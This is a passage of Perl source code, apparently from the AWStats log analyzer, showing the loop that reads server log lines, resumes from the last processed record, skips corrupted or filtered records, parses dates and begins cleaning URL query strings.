Load with save into a second plugin file if plugin enabled and second file not up to date. No use of FileSuffix\n\t\tif ( $DNSLookup == 1 ) {    # System DNS lookup required\n\t\t\t #if (! eval(\"use Socket;\")) { error(\"Failed to load perl module Socket.\"); }\n\t\t\t #use Socket;\n\t\t\t&Read_DNS_Cache( \\%TmpDNSLookup, \"$DNSLastUpdateCacheFile\",\n\t\t\t\t\"$FileSuffix\", 0 )\n\t\t\t  ;    # Load with no save into a second plugin file. Use FileSuffix\n\t\t}\n\t}\n\n\t# Processing log\n\t#------------------------------------------\n\n\tif ($EnableLockForUpdate) {\n\n\t\t# Trap signals to remove lock\n\t\t$SIG{INT} = \\&SigHandler;    # 2\n\t\t                             #$SIG{KILL} = \\&SigHandler;\t# 9\n\t\t                             #$SIG{TERM} = \\&SigHandler;\t# 15\n\t\t                             # Set AWStats update lock\n\t\t&Lock_Update(1);\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\"Start Update process (lastprocesseddate=$lastprocesseddate)\");\n\t}\n\n\t# Open log file\n\tif ($Debug) { debug(\"Open log file \\\"$LogFile\\\"\"); }\n\topen( LOG, \"$LogFile\" )\n\t  || error(\"Couldn't open server log file \\\"$LogFile\\\" : $!\");\n\tbinmode LOG\n\t  ;   # Avoid premature EOF due to log files corrupted with \\cZ or bin chars\n\n\t# Define local variables for loop scan\n\tmy @field               = ();\n\tmy $counterforflushtest = 0;\n\tmy $qualifdrop          = '';\n\tmy $countedtraffic      = 0;\n\n\t# Reset chrono for benchmark (first call to GetDelaySinceStart)\n\t&GetDelaySinceStart(1);\n\tif ( !scalar keys %HTMLOutput ) {\n\t\tprint \"Phase 1 : First bypass old records, searching new record...\\n\";\n\t}\n\n\t# Can we try a direct seek access in log ?\n\tmy $line;\n\tif ( $LastLine && $LastLineNumber && $LastLineOffset && $LastLineChecksum )\n\t{\n\n\t\t# Try a direct seek access to save time\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"Try a direct access to LastLine=$LastLine, LastLineNumber=$LastLineNumber, LastLineOffset=$LastLineOffset, LastLineChecksum=$LastLineChecksum\"\n\t\t\t);\n\t\t}\n\t\tseek( LOG, $LastLineOffset, 0 );\n\t\tif ( $line = <LOG> ) {\n\t\t\tchomp $line;\n\t\t\t$line =~ s/\\r$//;\n\t\t\t@field = map( /$PerlParsingFormat/, $line );\n\t\t\tif ($Debug) {\n\t\t\t\tmy $string = '';\n\t\t\t\tforeach ( 0 .. @field - 1 ) {\n\t\t\t\t\t$string .= \"$fieldlib[$_]=$field[$_] \";\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug( \" Read line after direct access: $string\", 1 );\n\t\t\t\t}\n\t\t\t}\n\t\t\tmy $checksum = &CheckSum($line);\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" LastLineChecksum=$LastLineChecksum, Read line checksum=$checksum\",\n\t\t\t\t\t1\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $checksum == $LastLineChecksum ) {\n\t\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\t\tprint\n\"Direct access after last parsed record (after line $LastLineNumber)\\n\";\n\t\t\t\t}\n\t\t\t\t$lastlinenb         = $LastLineNumber;\n\t\t\t\t$lastlineoffset     = $LastLineOffset;\n\t\t\t\t$lastlineoffsetnext = tell LOG;\n\t\t\t\t$NewLinePhase       = 1;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\t\tprint\n\"Direct access to last remembered record has fallen on another record.\\nSo searching new records from beginning of log file...\\n\";\n\t\t\t\t}\n\t\t\t\t$lastlinenb         = 0;\n\t\t\t\t$lastlineoffset     = 0;\n\t\t\t\t$lastlineoffsetnext = 0;\n\t\t\t\tseek( LOG, 0, 0 );\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\tprint\n\"Direct access to last remembered record is out of file.\\nSo searching it from beginning of log file...\\n\";\n\t\t\t}\n\t\t\t$lastlinenb         = 0;\n\t\t\t$lastlineoffset     = 0;\n\t\t\t$lastlineoffsetnext = 0;\n\t\t\tseek( LOG, 0, 0 );\n\t\t}\n\t}\n\telse {\n\n\t\t# No try of direct seek access\n\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\tprint \"Searching new records from beginning of log file...\\n\";\n\t\t}\n\t\t$lastlinenb         = 0;\n\t\t$lastlineoffset     = 0;\n\t\t$lastlineoffsetnext = 0;\n\t}\n\n\t#\n\t# Loop on each log line\n\t#\n\twhile ( $line = <LOG> ) {\n\t\t\n\t\t# 20080525 BEGIN Patch to test if first char of $line = hex \"00\" then conclude corrupted with binary code\n\t\tmy $FirstHexChar;\n\t\t$FirstHexChar = sprintf( \"%02X\", ord( substr( $line, 0, 1 ) ) );\n\t\tif ( $FirstHexChar eq '00' ) {\n\t\t\t$NbOfLinesCorrupted++;\n\t\t\tif ($ShowCorrupted) {\n\t\t\t\tprint \"Corrupted record line \"\n\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t  . \" (record starts with hex 00; binary code): $line\\n\";\n\t\t\t}\n\t\t\tif (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog\n\t\t\t\t&& $NbOfLinesParsed == $NbOfLinesCorrupted )\n\t\t\t{\n\t\t\t\terror( \"Format error\", $line, $LogFile );\n\t\t\t}    # Exit with format error\n\t\t\tnext;\n\t\t}\n\t\t# 20080525 END\n\n\t\tchomp $line;\n\t\t$line =~ s/\\r$//;\n\t\tif ( $UpdateFor && $NbOfLinesParsed >= $UpdateFor ) { last; }\n\t\t$NbOfLinesParsed++;\n\n\t\t$lastlineoffset     = $lastlineoffsetnext;\n\t\t$lastlineoffsetnext = tell LOG;\n\n\t\tif ($ShowSteps) {\n\t\t\tif ( ( ++$NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) == 0 ) {\n\t\t\t\tmy $delay = &GetDelaySinceStart(0);\n\t\t\t\tprint \"$NbOfLinesParsed lines processed (\"\n\t\t\t\t  . ( $delay > 0 ? $delay : 1000 ) . \" ms, \"\n\t\t\t\t  . int(\n\t\t\t\t\t1000 * $NbOfLinesShowsteps / ( $delay > 0 ? $delay : 1000 )\n\t\t\t\t  )\n\t\t\t\t  . \" lines/second)\\n\";\n\t\t\t}\n\t\t}\n\n\t\tif ( $LogFormat eq '2' && $line =~ /^#Fields:/ ) {\n\t\t\tmy @fixField = map( /^#Fields: (.*)/, $line );\n\t\t\tif ( $fixField[0] !~ /s-kernel-time/ ) {\n\t\t\t\tdebug( \"Found new log format: '\" . $fixField[0] . \"'\", 1 );\n\t\t\t\t&DefinePerlParsingFormat( $fixField[0] );\n\t\t\t}\n\t\t}\n\n\t\t# Parse line record to get all required fields\n\t\tif ( !( @field = map( /$PerlParsingFormat/, $line ) ) ) {\n\t\t\t# see if the line is a comment, blank or corrupted\n \t\t\tif ( $line =~ /^#/ || $line =~ /^!/ ) {\n\t\t\t\t$NbOfLinesComment++;\n\t\t\t\tif ($ShowCorrupted){\n\t\t\t\t\tprint \"Comment record line \"\n\t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t\t  . \": $line\\n\";\n\t\t\t\t}\n \t\t\t}\n \t\t\telsif ( $line =~ /^\\s*$/ ) {\n \t\t\t\t$NbOfLinesBlank++;\n\t\t\t\tif ($ShowCorrupted){\n\t\t\t\t\tprint \"Blank record line \"\n\t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t\t  . \"\\n\";\n\t\t\t\t}\n \t\t\t}else{\n \t\t\t\t$NbOfLinesCorrupted++;\n \t\t\t\tif ($ShowCorrupted){\n \t\t\t\tprint \"Corrupted record line \"\n  \t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n  \t\t\t\t\t  . \" (record format does not match LogFormat parameter): $line\\n\";\n  \t\t\t\t}\n\t\t\t}\n\t\t\tif (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog\n\t\t\t\t&& $NbOfLinesParsed == ($NbOfLinesCorrupted + $NbOfLinesComment + $NbOfLinesBlank))\n\t\t\t{\n\t\t\t\terror( \"Format error\", $line, $LogFile );\n\t\t\t}    # Exit with format error\n\t\t\tif ( $line =~ /^__end_of_file__/i ) { last; } # For test purpose only\n\t\t\tnext;\n\t\t}\n\n\t\tif ($Debug) {\n\t\t\tmy $string = '';\n\t\t\tforeach ( 0 .. @field - 1 ) {\n\t\t\t\t$string .= \"$fieldlib[$_]=$field[$_] \";\n\t\t\t}\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\t\t\t\t\t\" Correct format line \"\n\t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t\t  . \": $string\",\n\t\t\t\t\t4\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\n\t\t# Drop wrong virtual host name\n\t\t#----------------------------------------------------------------------\n\t\tif ( $pos_vh >= 0 && $field[$pos_vh] !~ /^$SiteDomain$/i ) {\n\t\t\tmy $skip = 1;\n\t\t\tforeach (@HostAliases) {\n\t\t\t\tif ( $field[$pos_vh] =~ /$_/ ) { $skip = 0; last; }\n\t\t\t}\n\t\t\tif ($skip) {\n\t\t\t\t$NbOfLinesDropped++;\n\t\t\t\tif ($ShowDropped) {\n\t\t\t\t\tprint\n\"Dropped record (virtual hostname '$field[$pos_vh]' does not match SiteDomain='$SiteDomain' nor HostAliases parameters): $line\\n\";\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t}\n\n\t\t# Drop wrong method/protocol\n\t\t#---------------------------\n\t\tif ( $LogType ne 'M' ) { $field[$pos_url] =~ s/\\s/%20/g; }\n\t\tif (\n\t\t\t$LogType eq 'W'\n\t\t\t&& (\n\t\t\t\t   $field[$pos_method] eq 'GET'\n\t\t\t\t|| $field[$pos_method] eq 'POST'\n\t\t\t\t|| $field[$pos_method] eq 'HEAD'\n\t\t\t\t|| $field[$pos_method] eq 'PROPFIND'\n\t\t\t\t|| $field[$pos_method] eq 'CHECKOUT'\n\t\t\t\t|| $field[$pos_method] eq 'LOCK'\n\t\t\t\t|| $field[$pos_method] eq 'PROPPATCH'\n\t\t\t\t|| $field[$pos_method] eq 'OPTIONS'\n\t\t\t\t|| $field[$pos_method] eq 'MKACTIVITY'\n\t\t\t\t|| $field[$pos_method] eq 'PUT'\n\t\t\t\t|| $field[$pos_method] eq 'MERGE'\n\t\t\t\t|| $field[$pos_method] eq 'DELETE'\n\t\t\t\t|| $field[$pos_method] eq 'REPORT'\n\t\t\t\t|| $field[$pos_method] eq 'MKCOL'\n\t\t\t\t|| $field[$pos_method] eq 'COPY'\n\t\t\t\t|| $field[$pos_method] eq 'RPC_IN_DATA'\n\t\t\t\t|| $field[$pos_method] eq 'RPC_OUT_DATA'\n\t\t\t\t|| $field[$pos_method] eq 'OK'             # Webstar\n\t\t\t\t|| $field[$pos_method] eq 'ERR!'           # Webstar\n\t\t\t\t|| $field[$pos_method] eq 'PRIV'           # Webstar\n\t\t\t)\n\t\t  )\n\t\t{\n\n# HTTP request.\tKeep only GET, POST, HEAD, *OK* and ERR! for Webstar. Do not keep OPTIONS, TRACE\n\t\t}\n\t\telsif (\n\t\t\t( $LogType eq 'W' || $LogType eq 'S' )\n\t\t\t&& (   uc($field[$pos_method]) eq 'GET'\n\t\t\t\t|| uc($field[$pos_method]) eq 'MMS'\n\t\t\t\t|| uc($field[$pos_method]) eq 'RTSP'\n\t\t\t\t|| uc($field[$pos_method]) eq 'HTTP'\n\t\t\t\t|| uc($field[$pos_method]) eq 'RTP' )\n\t\t  )\n\t\t{\n\n# Streaming request (windows media server, realmedia or darwin streaming server)\n\t\t}\n\t\telsif ( $LogType eq 'M' && $field[$pos_method] eq 'SMTP' ) {\n\n\t\t# Mail request ('SMTP' for mail log with maillogconvert.pl preprocessor)\n\t\t}\n\t\telsif (\n\t\t\t$LogType eq 'F'\n\t\t\t&& (   $field[$pos_method] eq 'RETR'\n\t\t\t\t|| $field[$pos_method] eq 'D'\n\t\t\t\t|| $field[$pos_method] eq 'o'\n\t\t\t\t|| $field[$pos_method] =~ /$regget/o )\n\t\t  )\n\t\t{\n\n\t\t\t# FTP GET request\n\t\t}\n\t\telsif (\n\t\t\t$LogType eq 'F'\n\t\t\t&& (   $field[$pos_method] eq 'STOR'\n\t\t\t\t|| $field[$pos_method] eq 'U'\n\t\t\t\t|| $field[$pos_method] eq 'i'\n\t\t\t\t|| $field[$pos_method] =~ /$regsent/o )\n\t\t  )\n\t\t{\n\n\t\t\t# FTP SENT request\n\t\t}\n\t\telsif($line =~ m/#Fields:/){\n \t\t\t# log #fields as comment\n \t\t\t$NbOfLinesComment++;\n \t\t\tnext;\t\t\t\n \t\t}else{\n\t\t\t$NbOfLinesDropped++;\n\t\t\tif ($ShowDropped) {\n\t\t\t\tprint\n\"Dropped record (method/protocol '$field[$pos_method]' not qualified when LogType=$LogType): $line\\n\";\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n\t\t$field[$pos_date] =~\n\t\t  tr/,-\\/ \\tT/::::::/s;  # \" \\t\" is used instead of \"\\s\" not known with tr\n\t\tmy @dateparts =\n\t\t  split( /:/, $field[$pos_date] ); # tr and split faster than @dateparts=split(/[\\/\\-:\\s]/,$field[$pos_date])\n\t\t # Detected date format: \n\t\t # dddddddddd, YYYY-MM-DD HH:MM:SS (IIS), MM/DD/YY\\tHH:MM:SS,\n\t\t # DD/Month/YYYY:HH:MM:SS (Apache), DD/MM/YYYY HH:MM:SS, Mon DD HH:MM:SS,\n\t\t # YYYY-MM-DDTHH:MM:SS (iso)\n\t\tif ( !$dateparts[1] ) {    # Unix timestamp\n\t\t\t(\n\t\t\t\t$dateparts[5], $dateparts[4], $dateparts[3],\n\t\t\t\t$dateparts[0], $dateparts[1], $dateparts[2]\n\t\t\t  )\n\t\t\t  = localtime( int( $field[$pos_date] ) );\n\t\t\t$dateparts[1]++;\n\t\t\t$dateparts[2] += 1900;\n\t\t}\n\t\telsif ( $dateparts[0] =~ /^....$/ ) {\n\t\t\tmy $tmp = $dateparts[0];\n\t\t\t$dateparts[0] = $dateparts[2];\n\t\t\t$dateparts[2] = $tmp;\n\t\t}\n\t\telsif ( $field[$pos_date] =~ /^..:..:..:/ ) {\n\t\t\t$dateparts[2] += 2000;\n\t\t\tmy $tmp = $dateparts[0];\n\t\t\t$dateparts[0] = $dateparts[1];\n\t\t\t$dateparts[1] = $tmp;\n\t\t}\n\t\telsif ( $dateparts[0] =~ /^...$/ ) {\n\t\t\tmy $tmp = $dateparts[0];\n\t\t\t$dateparts[0] = $dateparts[1];\n\t\t\t$dateparts[1] = $tmp;\n\t\t\t$tmp          = $dateparts[5];\n\t\t\t$dateparts[5] = $dateparts[4];\n\t\t\t$dateparts[4] = $dateparts[3];\n\t\t\t$dateparts[3] = $dateparts[2];\n\t\t\t$dateparts[2] = $tmp || $nowyear;\n\t\t}\n\t\tif ( exists( $MonthNum{ $dateparts[1] } ) ) {\n\t\t\t$dateparts[1] = $MonthNum{ $dateparts[1] };\n\t\t}    # Change lib month in num month if necessary\n\t\tif ( $dateparts[1] <= 0 )\n\t\t{ # Date corrupted (for example $dateparts[1]='dic' for december month in a spanish log file)\n\t\t\t$NbOfLinesCorrupted++;\n\t\t\tif ($ShowCorrupted) {\n\t\t\t\tprint \"Corrupted record line \"\n\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t  . \" (bad date format for month, may be month are not in english ?): $line\\n\";\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n# Now @dateparts is (DD,MM,YYYY,HH,MM,SS) and we're going to create $timerecord=YYYYMMDDHHMMSS\n\t\tif ( $PluginsLoaded{'ChangeTime'}{'timezone'} ) {\n\t\t\t@dateparts = ChangeTime_timezone( \\@dateparts );\n\t\t}\n\t\tmy $yearrecord  = int( $dateparts[2] );\n\t\tmy $monthrecord = int( $dateparts[1] );\n\t\tmy $dayrecord   = int( $dateparts[0] );\n\t\tmy $hourrecord  = int( $dateparts[3] );\n\t\tmy $daterecord  = '';\n\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\t$daterecord = sprintf( \"%04i%02i\", $yearrecord, $monthrecord );\n\t\t}\n\t\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t\t$daterecord = sprintf( \"%04i%\", $yearrecord );\n\t\t}\n\t\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t\t$daterecord =\n\t\t\t  sprintf( \"%04i%02i%02i\", $yearrecord, $monthrecord, $dayrecord );\n\t\t}\n\t\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t\t$daterecord = sprintf( \"%04i%02i%02i%02i\",\n\t\t\t\t$yearrecord, $monthrecord, $dayrecord, $hourrecord );\n\t\t}\n\n\t\t# TODO essayer de virer yearmonthrecord\n\t\tmy $yearmonthdayrecord =\n\t\t  sprintf( \"$dateparts[2]%02i%02i\", $dateparts[1], $dateparts[0] );\n\t\tmy $timerecord =\n\t\t  ( ( int(\"$yearmonthdayrecord\") * 100 + $dateparts[3] ) * 100 +\n\t\t\t  $dateparts[4] ) * 100 + $dateparts[5];\n\n\t\t# Check date\n\t\t#-----------------------\n\t\tif ( $LogType eq 'M' && $timerecord > $tomorrowtime ) {\n\n# Postfix/Sendmail does not store year, so we assume that year is year-1 if record is in future\n\t\t\t$yearrecord--;\n\t\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%02i\", $yearrecord, $monthrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%\", $yearrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%02i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord, $hourrecord );\n\t\t\t}\n\n\t\t\t# TODO essayer de virer yearmonthrecord\n\t\t\t$yearmonthdayrecord =\n\t\t\t  sprintf( \"$yearrecord%02i%02i\", $dateparts[1], $dateparts[0] );\n\t\t\t$timerecord =\n\t\t\t  ( ( int(\"$yearmonthdayrecord\") * 100 + $dateparts[3] ) * 100 +\n\t\t\t\t  $dateparts[4] ) * 100 + $dateparts[5];\n\t\t}\n\t\tif ( $timerecord < 10000000000000 || $timerecord > $tomorrowtime ) {\n\t\t\t$NbOfLinesCorrupted++;\n\t\t\tif ($ShowCorrupted) {\n\t\t\t\tprint\n\"Corrupted record (invalid date, timerecord=$timerecord): $line\\n\";\n\t\t\t}\n\t\t\tnext;   # Should not happen, kept in case of parasite/corrupted line\n\t\t}\n\t\tif ($NewLinePhase) {\n\n\t\t\t# TODO NOTSORTEDRECORDTOLERANCE does not work around midnight\n\t\t\tif ( $timerecord < ( $LastLine - $NOTSORTEDRECORDTOLERANCE ) ) {\n\n\t\t\t\t# Should not happen, kept in case of parasite/corrupted old line\n\t\t\t\t$NbOfLinesCorrupted++;\n\t\t\t\tif ($ShowCorrupted) {\n\t\t\t\t\tprint\n\"Corrupted record (date $timerecord lower than $LastLine-$NOTSORTEDRECORDTOLERANCE): $line\\n\";\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tif ( $timerecord <= $LastLine ) {    # Already processed\n\t\t\t\t$NbOfOldLines++;\n\t\t\t\tnext;\n\t\t\t}\n\n# We found a new line. This will replace comparison \"<=\" with \"<\" between timerecord and LastLine (we should have only new lines now)\n\t\t\t$NewLinePhase = 1;    # We will never enter here again\n\t\t\tif ($ShowSteps) {\n\t\t\t\tif ( $NbOfLinesShowsteps > 1\n\t\t\t\t\t&& ( $NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) )\n\t\t\t\t{\n\t\t\t\t\tmy $delay = &GetDelaySinceStart(0);\n\t\t\t\t\tprint \"\"\n\t\t\t\t\t  . ( $NbOfLinesParsed - 1 )\n\t\t\t\t\t  . \" lines processed (\"\n\t\t\t\t\t  . ( $delay > 0 ? $delay : 1000 ) . \" ms, \"\n\t\t\t\t\t  . int( 1000 * ( $NbOfLinesShowsteps - 1 ) /\n\t\t\t\t\t\t  ( $delay > 0 ? $delay : 1000 ) )\n\t\t\t\t\t  . \" lines/second)\\n\";\n\t\t\t\t}\n\t\t\t\t&GetDelaySinceStart(1);\n\t\t\t\t$NbOfLinesShowsteps = 1;\n\t\t\t}\n\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\tprint\n\"Phase 2 : Now process new records (Flush history on disk after \"\n\t\t\t\t  . ( $LIMITFLUSH << 2 )\n\t\t\t\t  . \" hosts)...\\n\";\n\n#print \"Phase 2 : Now process new records (Flush history on disk after \".($LIMITFLUSH<<2).\" hosts or \".($LIMITFLUSH).\" URLs)...\\n\";\n\t\t\t}\n\t\t}\n\n\t\t# Convert URL for Webstar to common URL\n\t\tif ( $LogFormat eq '3' ) {\n\t\t\t$field[$pos_url] =~ s/:/\\//g;\n\t\t\tif ( $field[$pos_code] eq '-' ) { $field[$pos_code] = '200'; }\n\t\t}\n\n# Here, field array, timerecord and yearmonthdayrecord are initialized for log record\n\t\tif ($Debug) {\n\t\t\tdebug( \"  This is a not already processed record ($timerecord)\",\n\t\t\t\t4 );\n\t\t}\n\n\t\t# Check if there's a CloudFlare Visitor IP in the query string\n\t\t# If it does, replace the ip\n\t\tif ( $pos_query >= 0 && $field[$pos_query] && $field[$pos_query] =~ /\\[CloudFlare_Visitor_IP[:](\\d+[.]\\d+[.]\\d+[.]\\d+)\\]/ ) {\n\t\t\t$field[$pos_host] = \"$1\";\n\t\t}\t\n\n\t\t# We found a new line\n\t\t#----------------------------------------\n\t\tif ( $timerecord > $LastLine ) {\n\t\t\t$LastLine = $timerecord;\n\t\t}    # Test should always be true except with not sorted log files\n\n\t\t# Skip for some client host IP addresses, some URLs, other URLs\n\t\tif (\n\t\t\t@SkipHosts\n\t\t\t&& ( &SkipHost( $field[$pos_host] )\n\t\t\t\t|| ( $pos_hostr && &SkipHost( $field[$pos_hostr] ) ) )\n\t\t  )\n\t\t{\n\t\t\t$qualifdrop =\n\t\t\t    \"Dropped record (host $field[$pos_host]\"\n\t\t\t  . ( $pos_hostr ? \" and $field[$pos_hostr]\" : \"\" )\n\t\t\t  . \" not qualified by SkipHosts)\";\n\t\t}\n\t\telsif ( @SkipFiles && &SkipFile( $field[$pos_url] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_url] not qualified by SkipFiles)\";\n\t\t}\n\t\telsif (@SkipUserAgents\n\t\t\t&& $pos_agent >= 0\n\t\t\t&& &SkipUserAgent( $field[$pos_agent] ) )\n\t\t{\n\t\t\t$qualifdrop =\n\"Dropped record (user agent '$field[$pos_agent]' not qualified by SkipUserAgents)\";\n\t\t}\n\t\telsif (@SkipReferrers\n\t\t\t&& $pos_referer >= 0\n\t\t\t&& &SkipReferrer( $field[$pos_referer] ) )\n\t\t{\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_referer] not qualified by SkipReferrers)\";\n\t\t}\n\t\telsif (@OnlyHosts\n\t\t\t&& !&OnlyHost( $field[$pos_host] )\n\t\t\t&& ( !$pos_hostr || !&OnlyHost( $field[$pos_hostr] ) ) )\n\t\t{\n\t\t\t$qualifdrop =\n\t\t\t    \"Dropped record (host $field[$pos_host]\"\n\t\t\t  . ( $pos_hostr ? \" and $field[$pos_hostr]\" : \"\" )\n\t\t\t  . \" not qualified by OnlyHosts)\";\n\t\t}\n\t\telsif ( @OnlyUsers && !&OnlyUser( $field[$pos_logname] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_logname] not qualified by OnlyUsers)\";\n\t\t}\n\t\telsif ( @OnlyFiles && !&OnlyFile( $field[$pos_url] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (URL $field[$pos_url] not qualified by OnlyFiles)\";\n\t\t}\n\t\telsif ( @OnlyUserAgents && !&OnlyUserAgent( $field[$pos_agent] ) ) {\n\t\t\t$qualifdrop =\n\"Dropped record (user agent '$field[$pos_agent]' not qualified by OnlyUserAgents)\";\n\t\t}\n\t\tif ($qualifdrop) {\n\t\t\t$NbOfLinesDropped++;\n\t\t\tif ($Debug) { debug( \"$qualifdrop: $line\", 4 ); }\n\t\t\tif ($ShowDropped) { print \"$qualifdrop: $line\\n\"; }\n\t\t\t$qualifdrop = '';\n\t\t\tnext;\n\t\t}\n\n\t\t# Record is approved\n\t\t#-------------------\n\n\t\t# Is it in a new break section ?\n\t\t#-------------------------------\n\t\tif ( $daterecord > $lastprocesseddate ) {\n\n\t\t\t# A new break to process\n\t\t\tif ( $lastprocesseddate > 0 ) {\n\n\t\t\t\t# We save data of previous break\n\t\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t\t\t$lastprocessedday,  $lastprocessedhour,\n\t\t\t\t\t1,                  1,\n\t\t\t\t\t\"all\", ( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t\t$lastlineoffset, &CheckSum($line)\n\t\t\t\t);\n\t\t\t\t$counterforflushtest = 0;    # We reset counterforflushtest\n\t\t\t}\n\t\t\t$lastprocessedyear  = $yearrecord;\n\t\t\t$lastprocessedmonth = $monthrecord;\n\t\t\t$lastprocessedday   = $dayrecord;\n\t\t\t$lastprocessedhour  = $hourrecord;\n\t\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\t\t$lastprocesseddate =\n\t\t\t\t  sprintf( \"%04i%02i\", $yearrecord, $monthrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t\t\t$lastprocesseddate = sprintf( \"%04i%\", $yearrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t\t\t$lastprocesseddate = sprintf( \"%04i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t\t\t$lastprocesseddate = sprintf( \"%04i%02i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord, $hourrecord );\n\t\t\t}\n\t\t}\n\n\t\t$countedtraffic = 0;\n\t\t$NbOfNewLines++;\n\n\t\t# Convert $field[$pos_size]\n\t\t# if ($field[$pos_size] eq '-') { $field[$pos_size]=0; }\n\n\t# Define a clean target URL and referrer URL\n\t# We keep a clean $field[$pos_url] and\n\t# we store original value for urlwithnoquery, tokenquery and standalonequery\n\t#---------------------------------------------------------------------------\n\t\tif ($URLNotCaseSensitive) { $field[$pos_url] = lc( $field[$pos_url] ); }\n\n# Possible URL syntax for $field[$pos_url]: /mydir/mypage.ext?param1=x&param2=y#aaa, /mydir/mypage.ext#aaa, /\n\t\tmy $urlwithnoquery;\n\t\tmy $tokenquery;\n\t\tmy $standalonequery;\n\t\tmy $anchor = '';\n\t\tif ( $field[$pos_url] =~ s/$regtruncanchor//o ) {\n\t\t\t$anchor = $1;\n\t\t}    # Remove and save anchor\n\t\tif ($URLWithQuery) {\n\t\t\t$urlwithnoquery = $field[$pos_url];\n\t\t\tmy $foundparam = ( $urlwithnoquery =~ s/$regtruncurl//o );\n\t\t\t$tokenquery      = $1 || '';\n\t\t\t$standalonequery = $2 || '';\n\n# For IIS setup, if pos_query is enabled we need to combine the URL to query strings\n\t\t\tif (   !$foundparam\n\t\t\t\t&& $pos_query >= 0\n\t\t\t\t&& $field[$pos_query]\n\t\t\t\t&& $field[$pos_query] ne '-' )\n\t\t\t{\n\t\t\t\t$foundparam      = 1;\n\t\t\t\t$tokenquery      = '?';\n\t\t\t\t$standalonequery = $field[$pos_query];\n\n\t\t\t\t# Define query\n\t\t\t\t$field[$pos_url] .= '?' . $field[$pos_query];\n\t\t\t}\n\t\t\tif ($foundparam) {\n\n  # Keep only params that are defined in URLWithQueryWithOnlyFollowingParameters\n\t\t\t\tmy $newstandalonequery = '';\n\t\t\t\tif (@URLWithQueryWithOnly) {\n\t\t\t\t\tforeach (@URLWithQueryWithOnly) {\n\t\t\t\t\t\tforeach my $p ( split( /&/, $standalonequery ) ) {\n\t\t\t\t\t\t\tif ($URLNotCaseSensitive) {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/i ) {\n\t\t\t\t\t\t\t\t\t$newstandalonequery .= \"$p&\";\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $p =~ /^$_=/ ) {\n\t\t\t\t\t\t\t\t\t$newstandalonequery .= \"$p&\";\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tchop $newstandalonequery;\n\t\t\t\t}\n\n# Remove params that are marked to be ignored in URLWithQueryWithoutFollowingParameters\n\t\t\t\telsif (@URLWithQueryWithout) {\n\t\t\t\t\tforeach my $p ( split( /&/, $standalonequery ) ) {\n\t\t\t\t\t\tmy $found = 0;\n\t\t\t\t\t\tforeach (@URLWithQueryWithout) {\n\n#if ($Debug) { debug(\"  Check if '$_=' is param '$p' to remove it from query\",5); }\n\t\t\t\t\t\t\tif ($URLNotCaseSensitive) 